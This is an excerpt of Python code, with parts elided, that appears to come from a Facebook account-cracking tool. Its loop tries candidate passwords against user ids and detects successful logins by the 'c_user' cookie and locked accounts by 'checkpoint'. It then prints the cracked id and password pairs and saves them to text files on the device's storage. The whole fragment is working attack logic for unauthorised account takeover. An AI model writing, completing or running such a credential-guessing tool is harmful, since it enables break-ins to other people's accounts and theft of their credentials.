...
def zeast():
    ...
    print(' Ids saved in ACXS-OK.txt,in cp ACXS-CP.txt')
    linex()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[ACXS-OK] '+uid+' • '+ps+'\033[0;97m')
                open('/sdcard/ACXS-OK.txt', 'a').write(cid+' • '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;31m[ACXS-CP] '+uid+' • '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        sys.stdout.write('\r[ACXS] %s|%s \x1b[1;92mOK:%s   \r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
